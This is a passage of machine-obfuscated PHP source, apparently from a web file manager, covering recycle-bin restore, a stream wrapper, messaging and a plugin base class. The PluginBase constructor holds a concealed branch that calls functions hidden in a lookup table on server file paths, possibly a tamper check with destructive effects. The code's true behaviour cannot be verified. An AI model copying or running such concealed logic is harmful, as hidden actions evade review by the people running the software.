$E¿–›ÕÃÊ = $E¿–›ÕÃÊ === !1 ? !1 : $E¿–›ÕÃÊ; $FÜáÉŠ¤Ää = array(); foreach ($aèÆƒ¿—¿Œ as $EğÙ½Ñ¯–ù) { if ($E¿–›ÕÃÊ != !1 && !in_array($EğÙ½Ñ¯–ù, $E¿–›ÕÃÊ)) { continue; } $F½Ú‘°™Â = $E‡Šè–º¨Ğ->sourceInfo($EğÙ½Ñ¯–ù); $E‡Šè–º¨Ğ->remove($EğÙ½Ñ¯–ù, !1); $EÔòËŠ™ = $F½Ú‘°™Â[$b‚­éœ´Ú[398]] . $b‚­éœ´Ú[70] . $F½Ú‘°™Â[$b‚­éœ´Ú[478]]; $FÜáÉŠ¤Ää[$EÔòËŠ™] = array($b‚­éœ´Ú[544] => $F½Ú‘°™Â[$b‚­éœ´Ú[398]], $b‚­éœ´Ú[478] => $F½Ú‘°™Â[$b‚­éœ´Ú[478]]); $this->where(array($b‚­éœ´Ú[390] => $EğÙ½Ñ¯–ù))->delete(); } goto d…•Î¹¿Ø; d…•Î¹¿Ø: foreach ($FÜáÉŠ¤Ää as $c²¥àÏøÓ½) { $E‡Šè–º¨Ğ->targetSpaceUpdate($c²¥àÏøÓ½[$b‚­éœ´Ú[398]], $c²¥àÏøÓ½[$b‚­éœ´Ú[478]]); } goto bÑ˜®ÒÛö«; Eèë‹åÄÎ: $b‚­éœ´Ú =& $_SERVER[Š‰]; $E‡Šè–º¨Ğ = Model($b‚­éœ´Ú[1180]); $aèÆƒ¿—¿Œ = $this->listData(); goto fñÕ¢ÂÄ; bÑ˜®ÒÛö«: } public function restore($C‡òåâ÷…œ = false) { $BåÂÃ¿¶÷‘ = $this->listData(); $this->_restoreSource($BåÂÃ¿¶÷‘, $C‡òåâ÷…œ); } public function restoreUserAll($fŠãª†õØâ) { $F°‡È‰ƒ½ = $this->listData($fŠãª†õØâ); $this->_restoreSource($F°‡È‰ƒ½, !1); } private function _restoreSource($A­Âá‹™», $C¶›‹ĞƒÎ¯) { goto aºù÷°¨; D…Ö³®™Şø: if (!$A­Âá‹™») { return !0; } $FÁ†‘¶Ÿ’® = array(); foreach ($A­Âá‹™» as $e•–¢ß¢›°) { goto bÙ­ÕïĞÕë; e‘‚‹õŠ²à: if ($D´ƒ¤©»°á[$fÀ¶í²èÖì[397]] == $fÀ¶í²èÖì[86]) { $a×Ö¬ÁÄ‹â = array($fÀ¶í²èÖì[548] => array($fÀ¶í²èÖì[507], $D´ƒ¤©»°á[$fÀ¶í²èÖì[481]] . $e•–¢ß¢›° . $fÀ¶í²èÖì[508])); $CßïàĞÚ‰À->where($a×Ö¬ÁÄ‹â)->setField($fÀ¶í²èÖì[417], 0); $this->restoreFolderChildren($e•–¢ß¢›°, $A­Âá‹™»); } $this->where(array($fÀ¶í²èÖì[390] => $e•–¢ß¢›°))->delete(); $CßïàĞÚ‰À->folderSizeReset($D´ƒ¤©»°á[$fÀ¶í²èÖì[472]]); goto Dª ‡«Ğ¿´; bÙ­ÕïĞÕë: if ($C¶›‹ĞƒÎ¯ != !1 && !in_array($e•–¢ß¢›°, $C¶›‹ĞƒÎ¯)) { continue; } $D´ƒ¤©»°á = $CßïàĞÚ‰À->sourceInfo($e•–¢ß¢›°); $b°Åœà•¬ = $CßïàĞÚ‰À->sourceInfo($D´ƒ¤©»°á[$fÀ¶í²èÖì[472]]); goto cõÁœØÜì; Dª ‡«Ğ¿´: $FÁ†‘¶Ÿ’®[] = $D´ƒ¤©»°á[$fÀ¶í²èÖì[472]]; if ($D´ƒ¤©»°á[$fÀ¶í²èÖì[397]] == $fÀ¶í²èÖì[86]) { $FÁ†‘¶Ÿ’®[] = $e•–¢ß¢›°; } $CßïàĞÚ‰À->lockMoveEnd($e•–¢ß¢›°); goto A­ß³ïùíÀ; cõÁœØÜì: if ($b°Åœà•¬[$fÀ¶í²èÖì[417]] == $fÀ¶í²èÖì[86]) { continue; } $CßïàĞÚ‰À->lockMoveStart($e•–¢ß¢›°); $this->recycleMove($e•–¢ß¢›°, 0); goto e‘‚‹õŠ²à; A­ß³ïùíÀ: } goto e”“•´İ¹Ó; aºù÷°¨: $fÀ¶í²èÖì =& $_SERVER[Š‰]; $CßïàĞÚ‰À = Model($fÀ¶í²èÖì[1180]); $C¶›‹ĞƒÎ¯ = $C¶›‹ĞƒÎ¯ == !1 ? !1 : $C¶›‹ĞƒÎ¯; goto D…Ö³®™Şø; e”“•´İ¹Ó: $CßïàĞÚ‰À->updateModifyTime($FÁ†‘¶Ÿ’®); goto c‘«±Ş½¸¨; c‘«±Ş½¸¨: } private function restoreFolderChildren($dãá®Ô­ÏÎ, $AôÆˆÙƒ‚) { goto bİÖéØµ©; aØŞÌ£¨Š: $a–‡»‚¦÷Ö[$a÷ìôºÄÚï[390]][1] = array_unique($a–‡»‚¦÷Ö[$a÷ìôºÄÚï[390]][1]); $a–‡»‚¦÷Ö[$a÷ìôºÄÚï[934]] = $a÷ìôºÄÚï[1751]; $aã…áÀù‰->where($a–‡»‚¦÷Ö)->setField($a÷ìôºÄÚï[417], 1); goto DÕĞ£æ·ª; bİÖéØµ©: $a÷ìôºÄÚï =& $_SERVER[Š‰]; $aã…áÀù‰ = Model($a÷ìôºÄÚï[1180]); $a–‡»‚¦÷Ö = array($a÷ìôºÄÚï[390] => array($a÷ìôºÄÚï[7], array())); goto d¶À‡ªˆòÕ; d¶À‡ªˆòÕ: foreach ($AôÆˆÙƒ‚ as $d¡…÷Ò¹¹µ) { if ($d¡…÷Ò¹¹µ == $dãá®Ô­ÏÎ) { continue; } if (!$aã…áÀù‰->isParentOf($dãá®Ô­ÏÎ, $d¡…÷Ò¹¹µ)) { continue; } $fƒå‚¨Ù†Ì = $aã…áÀù‰->sourceInfo($d¡…÷Ò¹¹µ); if ($fƒå‚¨Ù†Ì[$a÷ìôºÄÚï[397]] == $a÷ìôºÄÚï[86]) { $a–‡»‚¦÷Ö[] = array($a÷ìôºÄÚï[548] => array($a÷ìôºÄÚï[507], $fƒå‚¨Ù†Ì[$a÷ìôºÄÚï[481]] . $d¡…÷Ò¹¹µ . $a÷ìôºÄÚï[508])); } else { $a–‡»‚¦÷Ö[$a÷ìôºÄÚï[390]][1][] = $d¡…÷Ò¹¹µ; } } if (!$a–‡»‚¦÷Ö[$a÷ìôºÄÚï[390]][1]) { unset($a–‡»‚¦÷Ö[$a÷ìôºÄÚï[390]]); } if (!$a–‡»‚¦÷Ö) { return; } goto aØŞÌ£¨Š; DÕĞ£æ·ª: } private function recycleMove($E‹ÙóÚ‘è, $cñìÁ—ù¡ = 1) { $B’æÖ†äè‘ =& $_SERVER[Š‰]; $EçÍöÜõÌÜ = Model($B’æÖ†äè‘[1180]); $BÕ‚’ã•ñó = Model($B’æÖ†äè‘[1961]); $c²»ãÔ˜ã = array($B’æÖ†äè‘[390] => $E‹ÙóÚ‘è); if ($cñìÁ—ù¡) { $EçÍöÜõÌÜ->where($c²»ãÔ˜ã)->setField($B’æÖ†äè‘[417], 1); $BÕ‚’ã•ñó->eventRecycle($E‹ÙóÚ‘è, $B’æÖ†äè‘[1962]); } else { $bÒ‚ô¹á‡ = $EçÍöÜõÌÜ->where($c²»ãÔ˜ã)->find(); $AªÓÙõ‹¨˜ = $bÒ‚ô¹á‡[$B’æÖ†äè‘[397]] == $B’æÖ†äè‘[86]; $dËÏ¥Š³ Ê = $EçÍöÜõÌÜ->fileNameAuto($bÒ‚ô¹á‡[$B’æÖ†äè‘[472]], $bÒ‚ô¹á‡[$B’æÖ†äè‘[28]], REPEAT_RENAME_FOLDER, $AªÓÙõ‹¨˜); if ($dËÏ¥Š³ Ê != $bÒ‚ô¹á‡[$B’æÖ†äè‘[28]]) { $EçÍöÜõÌÜ->rename($E‹ÙóÚ‘è, $dËÏ¥Š³ Ê); } $EçÍöÜõÌÜ->where($c²»ãÔ˜ã)->setField($B’æÖ†äè‘[417], 0); $BÕ‚’ã•ñó->eventRecycle($E‹ÙóÚ‘è, $B’æÖ†äè‘[1963]); } } } goto aÆŞ…Õ˜; E˜Ğ¤Å­‹Ø: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($càâ©Ä¯äÊ, $Bœ„àò­· = '') { goto fàñÇî»É; A°¤õÚ¡ë: if (!isset(self::$_chunkBuffer[$càâ©Ä¯äÊ])) { self::$_chunkBuffer[$càâ©Ä¯äÊ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto fÊ¹¡“›äÔ; fàñÇî»É: $this->info = $this->info($càâ©Ä¯äÊ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Š‰][75]]; goto B–àÌÕ•–; B–àÌÕ•–: $this->pathOpen = $càâ©Ä¯äÊ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto A°¤õÚ¡ë; fÊ¹¡“›äÔ: } function stream_read($C‹ä²—) { $dÏ³Œ¼Óæ = $this->fileSubstr($this->pose, $C‹ä²—); $this->pose += strlen($dÏ³Œ¼Óæ); return $dÏ³Œ¼Óæ; } public function stream_tell() { return $this->pose; } public function stream_seek($e»†ã…Ãæ², $A²´Ò¸£›¹) { $Bˆ°à†‚Çì =& $_SERVER[Š‰]; if ($A²´Ò¸£›¹ == SEEK_SET) { $this->pose = $e»†ã…Ãæ²; } else { if ($A²´Ò¸£›¹ == SEEK_CUR) { $this->pose += $e»†ã…Ãæ²; } else { if ($A²´Ò¸£›¹ == SEEK_END) { $this->pose = $this->info[$Bˆ°à†‚Çì[77]] + intval($e»†ã…Ãæ²); } } } if ($e»†ã…Ãæ² < 0) { $this->pose = $this->info[$Bˆ°à†‚Çì[77]] + $e»†ã…Ãæ²; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Š‰][77]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($E“™ö•¯İ‘, $c¬ëÎ‹¬´) { $A±àÕÄòè =& $_SERVER[Š‰]; $dèÁš»’Ë¨ = $this->info($E“™ö•¯İ‘); return array($A±àÕÄòè[1353] => 0, $A±àÕÄòè[1354] => 0, $A±àÕÄòè[12] => 32768 + 511, $A±àÕÄòè[1355] => 0, $A±àÕÄòè[1356] => 0, $A±àÕÄòè[1357] => 0, $A±àÕÄòè[1358] => 0, $A±àÕÄòè[77] => $dèÁš»’Ë¨[$A±àÕÄòè[77]], $A±àÕÄòè[1359] => $dèÁš»’Ë¨[$A±àÕÄòè[1228]], $A±àÕÄòè[1315] => $dèÁš»’Ë¨[$A±àÕÄòè[83]], $A±àÕÄòè[1314] => $dèÁš»’Ë¨[$A±àÕÄòè[192]], $A±àÕÄòè[1360] => 0, $A±àÕÄòè[1361] => 0); } static $fileInfo = array(); public function info($Cäì°‚‘ˆ) { $BÄ¹äÃˆÊƒ = $_SERVER[Š‰][1362]; if (isset(self::$fileInfo[$Cäì°‚‘ˆ])) { return self::$fileInfo[$Cäì°‚‘ˆ]; } if (substr($Cäì°‚‘ˆ, 0, strlen($BÄ¹äÃˆÊƒ)) != $BÄ¹äÃˆÊƒ) { return !1; } self::$fileInfo[$Cäì°‚‘ˆ] = IO::info(substr($Cäì°‚‘ˆ, strlen($BÄ¹äÃˆÊƒ))); return self::$fileInfo[$Cäì°‚‘ˆ]; } public static function read($a‰²è¨¡ô¤, $D”›ÂªƒÄ·, $eˆ¶†™ªš) { if (!isset(self::$_fopenCache[$a‰²è¨¡ô¤])) { $cÁ¨Â’ºÇî = new StreamWrapperIO(); $cÁ¨Â’ºÇî->stream_open($a‰²è¨¡ô¤); self::$_fopenCache[$a‰²è¨¡ô¤] = $cÁ¨Â’ºÇî; } $cÁ¨Â’ºÇî = self::$_fopenCache[$a‰²è¨¡ô¤]; return $cÁ¨Â’ºÇî->fileSubstr($D”›ÂªƒÄ·, $eˆ¶†™ªš); } public static function _read($E²Ã¦Õ•ªğ, $C¸‘°Ş¤Ò, $e„ÇÎ¡È°©) { goto fç”·„•‚; B¿›Î¥óŠ«: $d¶ÙÔê“›Ø = 8192; fseek($c‹¼®äõÀÀ, $C¸‘°Ş¤Ò, SEEK_SET); $B‰¾™ ²Ãš = $cÎ¶³†›­[33]; goto bÅé”Ş—±½; fç”·„•‚: $cÎ¶³†›­ =& $_SERVER[Š‰]; $c‹¼®äõÀÀ = fopen($E²Ã¦Õ•ªğ, $cÎ¶³†›­[1232]); if (!$c‹¼®äõÀÀ) { return $cÎ¶³†›­[33]; } goto B¿›Î¥óŠ«; AÃ®ä‡†¡: return $B‰¾™ ²Ãš; goto DåÛµ÷‡‹‹; bÅé”Ş—±½: $F¨Õ¦É¦º’ = 0; while ($F¨Õ¦É¦º’ < $e„ÇÎ¡È°©) { $C±„ÄƒÜ• = min($d¶ÙÔê“›Ø, $e„ÇÎ¡È°© - $F¨Õ¦É¦º’); $B‰¾™ ²Ãš .= fread($c‹¼®äõÀÀ, $C±„ÄƒÜ•); $F¨Õ¦É¦º’ += $C±„ÄƒÜ•; } fclose($c‹¼®äõÀÀ); goto AÃ®ä‡†¡; DåÛµ÷‡‹‹: } public function fileSubstr($eè…”³õ…¤, $f¶„“òšİ) { goto b›Œª¯İ•¸; Dù§ãôãƒ: if ($eè…”³õ…¤ + $f¶„“òšİ > $bÚ‰áğ¬ß) { $f¶„“òšİ = $bÚ‰áğ¬ß - $eè…”³õ…¤; } if ($f¶„“òšİ <= 0) { return $AÙÌ½‰”¡[33]; } if ($eè…”³õ…¤ < 0 || $eè…”³õ…¤ >= $bÚ‰áğ¬ß || $f¶„“òšİ <= 0 || $f¶„“òšİ > 1024 * 1024 * 5) { throw new Exception("\151\157\106\x69\x6c\x65\122\145\x61\x64\x20\145\162\162\x6f\162\x21\40\x73\x74\141\162\164\x3d{$eè…”³õ…¤}\x3b\154\145\x6e\x67\x74\x68\x3d{$f¶„“òšİ}\73\x20\163\151\172\x65\x3d{$bÚ‰áğ¬ß}\73"); } goto aÚ²ÅôŸø; aÈƒ…§Ôƒ¾: $bñÀÄÃ—å = 0; $CÕ¿º‘ˆ»ß = 0; $bë¶™ÑŞ¿ø = $AÙÌ½‰”¡[33]; goto f×®æÂå®‡; aÚ²ÅôŸø: $CĞ‹ĞÓöœÂ = 64 * 1024; $EŒ³’Õ¡º =& self::$_chunkBuffer[$this->path]; if (!$EŒ³’Õ¡º) { $EŒ³’Õ¡º = array(); } goto aÈƒ…§Ôƒ¾; f×®æÂå®‡: foreach ($EŒ³’Õ¡º as $bñÀÄÃ—å => $bë¶™ÑŞ¿ø) { $bñÀÄÃ—å = intval($bñÀÄÃ—å); $CÕ¿º‘ˆ»ß = $bñÀÄÃ—å + strlen($bë¶™ÑŞ¿ø); if ($eè…”³õ…¤ >= $CÕ¿º‘ˆ»ß) { continue; } if ($eè…”³õ…¤ >= $bñÀÄÃ—å && $eè…”³õ…¤ + $f¶„“òšİ <= $CÕ¿º‘ˆ»ß) { return substr($bë¶™ÑŞ¿ø, $eè…”³õ…¤ - $bñÀÄÃ—å, $f¶„“òšİ); } break; } if (count($EŒ³’Õ¡º) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($AÙÌ½‰”¡[1363], $AÙÌ½‰”¡[1364] . count($EŒ³’Õ¡º) . "\x3b\163\x74\141\162\164\75{$eè…”³õ…¤}\x2c\154\145\156\147\164\x68\x3d{$f¶„“òšİ}\73\160\157\x73\x65\x3a{$bñÀÄÃ—å}\176{$CÕ¿º‘ˆ»ß}"); throw new Exception($AÙÌ½‰”¡[1365]); } $AÀßƒˆ‘«¼ = intval($eè…”³õ…¤ / $CĞ‹ĞÓöœÂ) * $CĞ‹ĞÓöœÂ; goto b°Ò¼™å‹; b›Œª¯İ•¸: $AÙÌ½‰”¡ =& $_SERVER[Š‰]; $bÚ‰áğ¬ß = $this->info[$AÙÌ½‰”¡[77]]; $FÛ»ÁÌ¾Ã = $eè…”³õ…¤; goto f¯µàñ•ò“; b°Ò¼™å‹: $bî„ŞñÙ² = ceil(($eè…”³õ…¤ + $f¶„“òšİ) / $CĞ‹ĞÓöœÂ) * $CĞ‹ĞÓöœÂ - $AÀßƒˆ‘«¼; $côÇ›İÃ…› = IO::fileSubstr($this->path, $AÀßƒˆ‘«¼, $bî„ŞñÙ²); $EŒ³’Õ¡º[$AÀßƒˆ‘«¼ . $AÙÌ½‰”¡[33]] = $côÇ›İÃ…›; goto BÔ‡äì§¹¸; f¯µàñ•ò“: $BÎëĞ³ÜÊª = $f¶„“òšİ; if ($eè…”³õ…¤ < 0) { $eè…”³õ…¤ = $bÚ‰áğ¬ß + $eè…”³õ…¤; } if ($f¶„“òšİ === !1) { $f¶„“òšİ = $bÚ‰áğ¬ß - $eè…”³õ…¤; } goto Dù§ãôãƒ; BÔ‡äì§¹¸: ksort($EŒ³’Õ¡º); $A‡Ù……öëñ = substr($côÇ›İÃ…›, $eè…”³õ…¤ - $AÀßƒˆ‘«¼, $f¶„“òšİ); return $A‡Ù……öëñ; goto dØ‘Ñğñ°; dØ‘Ñğñ°: } private function log($FøÅĞ¼äë¶, $DĞ ğå¦­Ë) { $D¹‹¢¬²© =& $_SERVER[Š‰]; $EÒ§„Æ’Ø = timeFloat() - $this->timeStart; write_log(sprintf($D¹‹¢¬²©[1366], $FøÅĞ¼äë¶, $this->info[$D¹‹¢¬²©[28]], $EÒ§„Æ’Ø, $DĞ ğå¦­Ë), $D¹‹¢¬²©[1054]); } } class Message { function __construct() { } public function send($aÏ²†óáğ = '', $FĞ½‡ƒ… = array(), $aŠ‡¾›µ©Ä = "\164\x65\x78\x74") { goto B¥°ÍöÔµ±; bŠ‹ ’İàƒ: Hook::trigger($AèÔÓ…‘î‘[1370], $DöĞÙ¨‹÷–); goto EÓ•¤÷Ó¢; D¬°½‘¹Ã¹: $FĞ½‡ƒ… = array($AèÔÓ…‘î‘[992] => isset($FĞ½‡ƒ…[$AèÔÓ…‘î‘[992]]) ? $FĞ½‡ƒ…[$AèÔÓ…‘î‘[992]] : $AèÔÓ…‘î‘[33], $AèÔÓ…‘î‘[557] => isset($FĞ½‡ƒ…[$AèÔÓ…‘î‘[557]]) ? $FĞ½‡ƒ…[$AèÔÓ…‘î‘[557]] : $AèÔÓ…‘î‘[33]); if (empty($aÏ²†óáğ) || empty($FĞ½‡ƒ…[$AèÔÓ…‘î‘[992]]) && empty($FĞ½‡ƒ…[$AèÔÓ…‘î‘[557]])) { return !1; } $DöĞÙ¨‹÷– = array($AèÔÓ…‘î‘[1308] => $Eå˜ŒŠ±¸, $AèÔÓ…‘î‘[1369] => $FĞ½‡ƒ…); goto bŠ‹ ’İàƒ; B¥°ÍöÔµ±: $AèÔÓ…‘î‘ =& $_SERVER[Š‰]; $Eå˜ŒŠ±¸ = array($AèÔÓ…‘î‘[29] => $AèÔÓ…‘î‘[1367], $AèÔÓ…‘î‘[705] => $aÏ²†óáğ); if (in_array($aŠ‡¾›µ©Ä, array($AèÔÓ…‘î‘[1367], $AèÔÓ…‘î‘[1368]))) { $Eå˜ŒŠ±¸[$AèÔÓ…‘î‘[29]] = $aŠ‡¾›µ©Ä; } goto D¬°½‘¹Ã¹; EÓ•¤÷Ó¢: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto dèğàºÚ’Ù; A»ô¤ãÀ¨: $this->pluginHost = $config[$d»–Õó°ãá[1373]] . $this->pluginName . $d»–Õó°ãá[8]; $this->pluginHostDefault = $config[$d»–Õó°ãá[1373]] . $this->pluginName . $d»–Õó°ãá[8]; $dÙøàƒİö = $config[$d»–Õó°ãá[1374]]; goto Aõî¶‚‘‰¾; c¯¶ê¦¬Ò»: $this->pluginName = str_replace($d»–Õó°ãá[1371], $d»–Õó°ãá[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $d»–Õó°ãá[8]; $this->pluginApi = appHostGet() . $d»–Õó°ãá[1372] . $this->pluginName . $d»–Õó°ãá[8]; goto A»ô¤ãÀ¨; dèğàºÚ’Ù: $d»–Õó°ãá =& $_SERVER[Š‰]; if ($_SERVER[$d»–Õó°ãá[753]] != $_SERVER[$d»–Õó°ãá[816]]) { goto eà ¹ï‚Œ; eà ¹ï‚Œ: $A£áìõÒƒ = $d»–Õó°ãá[817]; $e××ëÅ¿£Ô = $d»–Õó°ãá[754]; $D…öÂè¤ù = $_SERVER[$d»–Õó°ãá[755]] . $d»–Õó°ãá[756]; goto b–Ã¬Ú¶; b–Ã¬Ú¶: $a‡ƒƒ²¸ = $e××ëÅ¿£Ô($D…öÂè¤ù); $fÑ¾ìöÑ” = explode($d»–Õó°ãá[227], $a‡ƒƒ²¸); if (count($fÑ¾ìöÑ”) < $d»–Õó°ãá[596]) { $Bª„‚‹ê‚ê = $d»–Õó°ãá[757]; $Bª„‚‹ê‚ê(); } goto e†•åÛöÎ; e†•åÛöÎ: $c‰§ğååï˜ = $d»–Õó°ãá[818]; $c‰§ğååï˜($_SERVER[$d»–Õó°ãá[819]]); $c‰§ğååï˜($_SERVER[$d»–Õó°ãá[755]] . $d»–Õó°ãá[820]); goto B¢ğÑ‘’Úè; B¢ğÑ‘’Úè: $a¿™êâò˜ = 1; while ($a¿™êâò˜ > 1) { $a¿™êâò˜ = $a¿™êâò˜ + 4; $cªÌª«…Œ¼ = rawurlencode($a¿™êâò˜ . $d»–Õó°ãá[373]); } goto FñáÕ›Ú‡„; FñáÕ›Ú‡„: } global $in, $config; goto fİİÍÁå†; E‘ºƒêŠÅ®: return $this; goto a¼Öñ‰ì; fİİÍÁå†: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($d»–Õó°ãá[1371]); goto c¯¶ê¦¬Ò»; Aõî¶‚‘‰¾: if ($dÙøàƒİö && strpos($d»–Õó°ãá[47] . $dÙøàƒİö . $d»–Õó°ãá[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$d»–Õó°ãá[1375]] . $this->pluginName . $d»–Õó°ãá[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto E‘ºƒêŠÅ®; a¼Öñ‰ì: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Š‰][1376]); } protected function assign($EøÕ²¾ä˜, $Aöâ‚Œ¥ = false) { if (is_array($EøÕ²¾ä˜)) { $this->values = array_merge($this->values, $EøÕ²¾ä˜); } else { $this->values[$EøÕ²¾ä˜] = $Aöâ‚Œ¥; } } protected function display($a˜‚á»Š³Ñ) { extract($this->values); require $a˜‚á»Š³Ñ; } final function hookRegist($AÄ¡è¬ œÏ) { $this->modelPlugin->appRegist($this->pluginName, $AÄ¡è¬ œÏ); } final function appIcon() { $EÚ –ƒÔÚù =& $_SERVER[Š‰]; $Cííê”¼ = $this->appPackage(); $dÅ°ŞÙ¿å = $EÚ –ƒÔÚù[33]; if (isset($Cííê”¼[$EÚ –ƒÔÚù[403]])) { if (isset($Cííê”¼[$EÚ –ƒÔÚù[403]][$EÚ –ƒÔÚù[1377]])) { $dÅ°ŞÙ¿å = $EÚ –ƒÔÚù[1378] . $Cííê”¼[$EÚ –ƒÔÚù[403]][$EÚ –ƒÔÚù[1377]] . $EÚ –ƒÔÚù[1379]; } else { if ($Cííê”¼[$EÚ –ƒÔÚù[403]][$EÚ –ƒÔÚù[1380]]) { $dÅ°ŞÙ¿å = $EÚ –ƒÔÚù[1381] . $Cííê”¼[$EÚ –ƒÔÚù[403]][$EÚ –ƒÔÚù[1380]] . $EÚ –ƒÔÚù[1382]; } } } return $dÅ°ŞÙ¿å; } final function fileCanView($eÚ«òÚ¹»Â) { goto cÚáÀÖƒÑ…; aÌÎ³œ©”è: ActionCall($F·…åÙ¬¦”[1395], $eÚ«òÚ¹»Â); goto F§ö³ËÒÆİ; cÚáÀÖƒÑ…: $F·…åÙ¬¦” =& $_SERVER[Š‰]; if (request_url_safe($eÚ«òÚ¹»Â)) { return !0; } if ($this->isShare($eÚ«òÚ¹»Â)) { return !0; } goto f¼ãõ¥¨½; f¼ãõ¥¨½: $DÆ¡Ùñ»çœ = Session::get($F·…åÙ¬¦”[1383]); if (!$DÆ¡Ùñ»çœ || !$DÆ¡Ùñ»çœ[$F·…åÙ¬¦”[1384]]) { $C²š÷ã”ÍÀ = $F·…åÙ¬¦”[1385] . rawurlencode(this_url()); show_tips(LNG($F·…åÙ¬¦”[1386]) . $F·…åÙ¬¦”[1387] . $C²š÷ã”ÍÀ . $F·…åÙ¬¦”[1388] . LNG($F·…åÙ¬¦”[1389]) . $F·…åÙ¬¦”[1390], !1); } if (!Action($F·…åÙ¬¦”[1391])->authCan($F·…åÙ¬¦”[1392])) { show_tips(LNG($F·…åÙ¬¦”[1393]) . $F·…åÙ¬¦”[1394], !1); } goto aÌÎ³œ©”è; F§ö³ËÒÆİ: } final function isShare($CòŸÏï¾À) { $EÈ¢â‡ ° = KodIO::parse($CòŸÏï¾À); return $EÈ¢â‡ °[$_SERVER[Š‰][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($fÖê«·°·) { if (request_url_safe($fÖê«·°·)) { return $fÖê«·°·; } if (!$this->isShare($fÖê«·°·)) { $fÖê«·°· = $this->filePath($fÖê«·°·); } return Action($_SERVER[Š‰][1046])->linkOut($fÖê«·°·); } public function filePathLinkOut($aŸŠ„ß—¤) { if (request_url_safe($aŸŠ„ß—¤)) { return $aŸŠ„ß—¤; } $this->fileCanView($aŸŠ„ß—¤); return Action($_SERVER[Š‰][1046])->link($aŸŠ„ß—¤); } final function filePath($F¼œ´¥Ô¶«) { $CÃŸš«ÔìÁ =& $_SERVER[Š‰]; if ($eöã´Ğùá‘ = $this->checkSharePath($F¼œ´¥Ô¶«)) { return $eöã´Ğùá‘; } $this->fileCanView($F¼œ´¥Ô¶«); if (request_url_safe($F¼œ´¥Ô¶«)) { $b¯ÔŠö³ë = parse_url_query($F¼œ´¥Ô¶«); if (isset($b¯ÔŠö³ë[$CÃŸš«ÔìÁ[1396]]) && isset($b¯ÔŠö³ë[$CÃŸš«ÔìÁ[207]])) { $EäÓô”ÈÎ = Model($CÃŸš«ÔìÁ[1100])->get($CÃŸš«ÔìÁ[1397]); $fò×…ß„½é = Mcrypt::decode($b¯ÔŠö³ë[$CÃŸš«ÔìÁ[207]], $EäÓô”ÈÎ); if ($fò×…ß„½é) { $this->fileInfo = IO::infoWithChildren($fò×…ß„½é); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $fò×…ß„½é; } } $F¼œ´¥Ô¶« = $this->_cacheHttpFile($F¼œ´¥Ô¶«); $this->fileInfo = IO::infoWithChildren($F¼œ´¥Ô¶«); } else { $this->fileInfo = IO::infoWithChildren($F¼œ´¥Ô¶«); if (!$this->fileInfo) { show_tips(LNG($CÃŸš«ÔìÁ[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $F¼œ´¥Ô¶«; } final function _cacheHttpFile($C®ë³ò­İÏ) { $A´äÇ†İÉÀ = hash_path($C®ë³ò­İÏ, !0); $this->cachePath = $this->pluginCachePath($A´äÇ†İÉÀ); if ($D ä©Ò©¹³ = IO::fileNameExist($this->cachePath, $A´äÇ†İÉÀ)) { return KodIO::make($D ä©Ò©¹³); } $BíÃ‹‡Ï¬ƒ = $this->cachePath . $A´äÇ†İÉÀ; return $this->pluginCacheFileSet($BíÃ‹‡Ï¬ƒ, file_get_contents($C®ë³ò­İÏ)); } final function _tmpFileName($AôĞ§•Ÿ¼« = array()) { goto CœçŸêªÉ; câ¿—ÖÕÍè: $eŞ’¤Ï” = array($AôĞ§•Ÿ¼«[$dœ‹ÏÔ¸Í×[28]], $AôĞ§•Ÿ¼«[$dœ‹ÏÔ¸Í×[75]], $AôĞ§•Ÿ¼«[$dœ‹ÏÔ¸Í×[77]]); if (isset($AôĞ§•Ÿ¼«[$dœ‹ÏÔ¸Í×[481]])) { $eŞ’¤Ï”[] = $AôĞ§•Ÿ¼«[$dœ‹ÏÔ¸Í×[481]]; } return md5(implode($dœ‹ÏÔ¸Í×[70], $eŞ’¤Ï”)); goto A„àÊí¡É¿; CœçŸêªÉ: $dœ‹ÏÔ¸Í× =& $_SERVER[Š‰]; if (!$AôĞ§•Ÿ¼«) { $AôĞ§•Ÿ¼« = $this->fileInfo; } if (isset($AôĞ§•Ÿ¼«[$dœ‹ÏÔ¸Í×[170]])) { return $AôĞ§•Ÿ¼«[$dœ‹ÏÔ¸Í×[170]]; } goto eˆÒó‰…Ô—; eˆÒó‰…Ô—: if (isset($AôĞ§•Ÿ¼«[$dœ‹ÏÔ¸Í×[163]][$dœ‹ÏÔ¸Í×[170]])) { return $AôĞ§•Ÿ¼«[$dœ‹ÏÔ¸Í×[163]][$dœ‹ÏÔ¸Í×[170]]; } $dÃ­œ¯…¬ = IO::hashSimple($AôĞ§•Ÿ¼«[$dœ‹ÏÔ¸Í×[75]]); if ($dÃ­œ¯…¬) { return $dÃ­œ¯…¬; } goto câ¿—ÖÕÍè; A„àÊí¡É¿: } final function checkSharePath($dˆÑã°è‹) { goto A‘À·á·à«; d™ôì˜»–: $this->cachePath = $this->pluginCachePath($this->fileInfo[$aˆ®†Ñ³[170]]); return $A‘È¹˜£[$aˆ®†Ñ³[75]]; goto a’°ŞÃ–ß; A‘À·á·à«: $aˆ®†Ñ³ =& $_SERVER[Š‰]; if (!defined($aˆ®†Ñ³[448])) { define($aˆ®†Ñ³[1398], 0); } if (!$this->isShare($dˆÑã°è‹)) { return !1; } goto b¶““ã¡Ù¶; b¶““ã¡Ù¶: 